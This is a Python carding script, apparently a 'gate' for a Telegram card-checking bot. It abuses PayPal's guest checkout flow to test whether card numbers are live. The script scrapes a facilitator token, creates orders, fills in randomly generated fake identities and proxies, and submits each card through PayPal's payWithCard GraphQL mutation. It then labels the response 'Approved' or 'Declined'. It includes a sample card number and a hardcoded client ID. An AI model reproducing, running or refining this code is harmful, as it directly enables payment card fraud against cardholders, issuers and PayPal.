"""
AT Gate Engine - PayPal Commerce Standard Card Fields with full Session Context
Fixes GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED by executing:
1. Smart Buttons Session initialization
2. Order creation
3. GetCheckoutDetails session sync
4. UpdateClientConfig fundingSource handshake
5. Mutation payWithCard submission with matching context headers
"""
import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import aiohttp
import time
import json
import random
import re

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def get_paypal_card_brand(cc):
    cc = str(cc).strip()
    if cc.startswith('4'):
        return 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')) or (len(cc) >= 2 and 22 <= int(cc[:2]) <= 27):
        return 'MASTER_CARD'
    elif cc.startswith(('34', '37')):
        return 'AMEX'
    elif cc.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
        return 'DISCOVER'
    elif cc.startswith(('300', '301', '302', '303', '304', '305', '36', '38')):
        return 'DINERS_CLUB'
    elif len(cc) >= 4 and 3528 <= int(cc[:4]) <= 3589:
        return 'JCB'
    return 'VISA'

def _parse_between(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

async def check_card_at(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    proxy_url = _format_proxy(proxy_url)
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    card_brand = get_paypal_card_brand(cc)
    
    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com"
    phone = f"206{random.randint(100,999)}{random.randint(1000,9999)}"
    street = f"{random.randint(100,9999)} Main St"
    city = "New York"
    state = "NY"
    zip_code = "10001"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=25)

    headers_browser = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Fetch Facilitator Access Token from PayPal Smart Buttons endpoint
            sdk_corr = "".join(random.choices("abcdef0123456789", k=14))
            storage_id = "".join(random.choices("abcdef0123456789", k=7))
            session_id = "".join(random.choices("abcdef0123456789", k=7))
            button_session_id = "".join(random.choices("abcdef0123456789", k=7))
            
            client_id = "AcA0fwaaFy07ymM_IupkyViI97Q8hUy5eDC-_8RTZEO-gl-krglTyI7Cs7OBB9-BYvbcxilau-FwZInL"
            smart_url = (
                f"https://www.paypal.com/smart/buttons?"
                f"style.label=pay&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false"
                f"&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US"
                f"&clientID={client_id}&sdkCorrelationID={sdk_corr}&storageID=uid_{storage_id}_mdi6mzu6mzm"
                f"&sessionID=uid_{session_id}_mdi6mzu6mzm&buttonSessionID=uid_{button_session_id}_mdi6mzu6mzu"
                f"&env=production&flow=purchase&currency=USD&intent=capture&commit=true"
            )
            
            async with session.get(smart_url, headers=headers_browser, proxy=proxy_url) as r_smart:
                smart_html = await r_smart.text()
            
            bearer = _parse_between(smart_html, '"facilitatorAccessToken":"', '"')
            if not bearer:
                return False, "Error! ⚠️", "Failed to retrieve PayPal facilitatorAccessToken", smart_html[:200]

            # 2. Create PayPal Checkout Order
            order_url = 'https://www.paypal.com/v2/checkout/orders'
            order_headers = {
                'authorization': f'Bearer {bearer}',
                'content-type': 'application/json',
                'accept': 'application/json',
                'Origin': 'https://www.paypal.com',
                'User-Agent': headers_browser['User-Agent'],
            }
            order_payload = {
                "purchase_units": [{
                    "reference_id": f"VAL-{random.randint(10000,99999)}-basket",
                    "amount": {"currency_code": "USD", "value": "11.72"},
                    "description": "Value Deels order"
                }],
                "intent": "CAPTURE",
                "application_context": {}
            }
            
            async with session.post(order_url, headers=order_headers, json=order_payload, proxy=proxy_url) as r_order:
                order_json = await r_order.json()
                
            token = order_json.get("id")
            if not token:
                return False, "Error! ⚠️", f"Failed to create PayPal Order: {order_json}", str(order_json)

            # 3. Session Context Sync (GetCheckoutDetails + UpdateClientConfig)
            headers_gql = {
                'authorization': f'Bearer {bearer}',
                'content-type': 'application/json',
                'accept': '*/*',
                'origin': 'https://www.paypal.com',
                'user-agent': headers_browser['User-Agent'],
            }
            
            # 3a. GetCheckoutDetails
            json_details = {
                'query': 'query GetCheckoutDetails($orderID: String!) { checkoutSession(token: $orderID) { cart { billingType productCode intent paymentId billingToken amounts { total { currencyValue currencyCode currencyFormatSymbolISOCurrency } } supplementary { initiationIntent } category } flags { isChangeShippingAddressAllowed } payees { merchantId email { stringValue } } } }',
                'variables': {'orderID': token},
            }
            async with session.post('https://www.paypal.com/graphql?GetCheckoutDetails', headers=headers_gql, json=json_details, proxy=proxy_url) as r_det:
                await r_det.read()

            # 3b. UpdateClientConfig (Configures funding source to card)
            json_config = {
                'query': 'mutation UpdateClientConfig($orderID: String!, $fundingSource: ButtonFundingSourceType!, $integrationArtifact: IntegrationArtifactType!, $userExperienceFlow: UserExperienceFlowType!, $productFlow: ProductFlowType, $buttonSessionID: String) { updateClientConfig(token: $orderID, fundingSource: $fundingSource, integrationArtifact: $integrationArtifact, userExperienceFlow: $userExperienceFlow, productFlow: $productFlow, buttonSessionID: $buttonSessionID) }',
                'variables': {
                    'orderID': token,
                    'fundingSource': 'card',
                    'integrationArtifact': 'PAYPAL_JS_SDK',
                    'userExperienceFlow': 'INLINE',
                    'productFlow': 'SMART_PAYMENT_BUTTONS',
                },
            }
            async with session.post('https://www.paypal.com/graphql?UpdateClientConfig', headers=headers_gql, json=json_config, proxy=proxy_url) as r_cfg:
                await r_cfg.read()

            # 4. Submit Card Payment via PayPal GraphQL standardcardfields
            gql_url = 'https://www.paypal.com/graphql?paywithcard'
            gql_headers = {
                'paypal-client-context': token,
                'paypal-client-metadata-id': token,
                'content-type': 'application/json',
                'x-country': 'US',
                'x-app-name': 'standardcardfields',
                'Accept': '*/*',
                'Origin': 'https://www.paypal.com',
                'Referer': f'https://www.paypal.com/smart/card-fields?token={token}',
                'User-Agent': headers_browser['User-Agent'],
            }
            
            gql_query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                        }
                    }
                }
            }
            """
            
            gql_payload = {
                "query": gql_query,
                "variables": {
                    "token": token,
                    "card": {
                        "cardNumber": cc,
                        "type": card_brand,
                        "expirationDate": f"{mm}/{yy}",
                        "postalCode": zip_code,
                        "securityCode": cvc
                    },
                    "phoneNumber": phone,
                    "firstName": first,
                    "lastName": last,
                    "billingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": street,
                        "city": city,
                        "state": state,
                        "postalCode": zip_code,
                        "country": "US"
                    },
                    "shippingAddress": {
                        "givenName": first,
                        "familyName": last,
                        "line1": street,
                        "city": city,
                        "state": state,
                        "postalCode": zip_code,
                        "country": "US"
                    },
                    "email": email,
                    "currencyConversionType": "PAYPAL"
                },
                "operationName": None
            }
            
            async with session.post(gql_url, headers=gql_headers, json=gql_payload, proxy=proxy_url) as r_gql:
                resp_text = await r_gql.text()
                try:
                    resp_json = json.loads(resp_text)
                except Exception:
                    resp_json = {}

            # 5. Classify Response
            if "INVALID_SECURITY_CODE" in resp_text or "incorrect_cvc" in resp_text:
                return True, "Approved! 🟩", "Auth Success (CVV / CCN Live)", resp_text
            elif "INVALID_BILLING_ADDRESS" in resp_text or "insufficient_funds" in resp_text or "INSUFFICIENT_FUNDS" in resp_text:
                return True, "Approved! 🟩", "Auth Success (Address/Funds Live)", resp_text
            elif "is3DSecureRequired" in resp_text or '"intent":"CAPTURE"' in resp_text or '"intent":"SALE"' in resp_text:
                return True, "Approved! 🟩", "Approved (Card Captured / 3DS Required)", resp_text
            elif "do_not_honor" in resp_text or "DO_NOT_HONOR" in resp_text:
                return False, "Declined! 🔴", "Do Not Honor (Declined by Issuer)", resp_text
            elif "generic_decline" in resp_text or "GENERIC_DECLINE" in resp_text:
                return False, "Declined! 🔴", "Generic Decline", resp_text
            elif "CARD_DECLINED" in resp_text:
                return False, "Declined! 🔴", "Card Declined", resp_text
            elif "INVALID_RESOURCE_ID" in resp_text:
                return False, "Declined! 🔴", "Invalid Resource ID", resp_text
            elif "GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED" in resp_text:
                return False, "Declined! 🔴", "Integrity Check: Proxy or Card Flagged", resp_text
            
            err_msg = ""
            if "errors" in resp_json and len(resp_json["errors"]) > 0:
                err_msg = resp_json["errors"][0].get("message", "")
                if not err_msg and "data" in resp_json["errors"][0]:
                    err_msg = str(resp_json["errors"][0]["data"])
            
            return False, "Declined! 🔴", err_msg if err_msg else "Payment Declined", resp_text

    except Exception as e:
        return False, "Error! ⚠️", str(e), ""

if __name__ == '__main__':
    test_card = sys.argv[1] if len(sys.argv) > 1 else "4833160315600632|09|2030|000"
    p = test_card.split('|')
    print(f"[*] Running Fixed Native Test of AT Gate on: {test_card}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_at(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    
    print(f"""
=== TELEGRAM BOT OUTPUT (AT GATE) ===
Gate Auth: >_ PayPal Commerce Auth ($0.00)
----------------------------------------
Card: {test_card}
Status: {status}
Response: {response}
----------------------------------------
Time: {elapsed}s | Gateway: Auth (AT)
""")
